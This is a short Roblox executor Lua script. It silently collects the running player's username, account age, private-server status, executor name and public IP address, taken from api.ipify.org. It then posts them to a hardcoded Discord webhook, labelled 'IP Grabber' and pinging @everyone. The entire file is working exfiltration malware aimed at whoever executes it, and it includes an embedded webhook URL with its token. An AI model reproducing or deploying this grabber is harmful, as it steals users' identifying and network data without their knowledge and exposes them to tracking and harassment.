local Webhook = "https://discordapp.com/api/webhooks/1095608897101906011/KKGDiOdAVBHRtQNgQYMFFto2hqcFNmoHqp_9q7Efdt4m8E5eR74OQTkb1wpgt2H_gk7g"
local VIP = game.VIPServerOwnerId ~= 1

local plrname = game.Players.LocalPlayer.Name
local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local ip = tostring(game:HttpGet("https://api.ipify.org", true))
Parent = game.Workspace
local Day = game.Players.LocalPlayer.AccountAge
local PlayerData =
{
       ["content"] = "@everyone **Someone Run The Script**",
       ["embeds"] = {
           {
           ["title"] = "Name: "..plrname,
           ["description"] = "**Execute is: **".. identifyexecutor(),
           ["color"] = tonumber(0x00FF00),
           ["fields"] = {
               {
                   ["name"] = "Check Private Server",
                   ["value"] = VIP,
                   ["inline"] = true
                },
           },
           ["type"] = "rich",
           ["footer"] = { text = "IP Grabber: " ..ip};
           ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
        }
    }
}

local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)

Request = http_request or request or HttpPost or syn.request
Request(
    {
        Url = Webhook, 
        Body = PlayerData, 
        Method = "POST", 
        Headers = {["content-type"] = "application/json"} 
    }
)
